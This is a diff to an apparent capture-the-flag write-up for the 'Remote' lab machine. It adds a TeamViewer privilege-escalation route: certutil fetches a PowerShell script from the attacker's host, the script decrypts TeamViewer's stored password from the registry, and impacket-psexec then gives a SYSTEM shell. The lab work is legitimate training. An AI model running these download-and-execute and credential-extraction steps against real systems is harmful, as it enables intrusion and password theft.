@@ -149,7 +149,7 @@ We can now grab the user.txt flag:
 
 ![remote_user_flag.png](../assets/remote_assets/remote_user_flag.png)
 
-### Privilege Escalation
+### Privilege Escalation 1 (Juicy PotatoNG)
 
 Running `whoami /all` we see that SeImpersonatePrivilege is enabled:
 
@@ -191,6 +191,80 @@ nt authority\system
 And we can grab the final flag:
 
 ![remote_root_flag.png](../assets/remote_assets/remote_root_flag.png)
+
+### Privilege Escalation 2 (TeamViewer)
+
+Feeling like I may have missed something, I checked out out the official writeup to see if the intended path was to exploit the SeImpersonatePrivilege as we did here. 
+
+The writeup features two routes, one with the privilege abuse (they used PrintSpoofer, which oddly didn't work for me), but also another exploiting TeamViewer and extracting passwords.
+
+The writeup uses the teamViewer_passwords module in metasploit, but I found this script to achieve the same thing: https://github.com/zaphoxx/WatchTV
+
+We can just copy it over and run it:
+
+```
+PS C:\temp> certutil -urlcache -split -f "http://10.10.14.114/teamviewer_password_extract.ps1"
+****  Online  ****
+  0000  ...
+  1882
+CertUtil: -URLCache command completed successfully.
+PS C:\temp> . ./teamviewer_password_extract.ps1
+PS C:\temp> Get-TeamViewPasswords
+
+#################L   .###############u
+##################N.@################ *
+##################################### '>.n=L
+###############################RR#### 'b"  9
+###########################R#"  .#### @   .*
+########################^   .e#######P   e"
+#####################R#    o########P   @
+###################P" .e> 4#" '####F  .F
+#################R  .###& '#   ####  .#>
+#################b.o#####  #N  "##" ."'>
+#########################  ##N  "^ .# '>
+############## "########R  ###&    ## '>
+##############  E"##P^9#E  ####   8## '>
+##############  E  "  9#F  ####k .### '>
+##############  E     9#N  ########## '>
+##############  E     9##.u########## '>
+############## o"     9############## d
+**************#       ***************
+ManniTV
+
+[+] HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7
+	[-] Version : 7.0.43148
+		[+] SecurityPasswordAES : 255 155 28 115 214 107 206 49 172 65 62 174 19 27 70 79 88 47 108 226 209 225 243 218 126 141 55 107 38 57 78 91
+		[+] decrypt password ...
+		[+] decrypted password: !R3m0te!
+```
+
+There's no guarantee this will be reused for admin access, but it's worth trying. 
+
+We find we can psexec in as administrator:
+
+```
+┌──(ryan㉿kali)-[~/HTB]
+└─$ impacket-psexec administrator@10.129.86.1                                         
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.129.86.1.....
+[*] Found writable share ADMIN$
+[*] Uploading file VWgzqqVY.exe
+[*] Opening SVCManager on 10.129.86.1.....
+[*] Creating service TRJH on 10.129.86.1.....
+[*] Starting service TRJH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+remote
+```
+I'm happy I went back and looked at the writeup after I rooted the box. Its a good habit to get into because you never know when you'll learn something new.
 
 Thanks for following along!
 
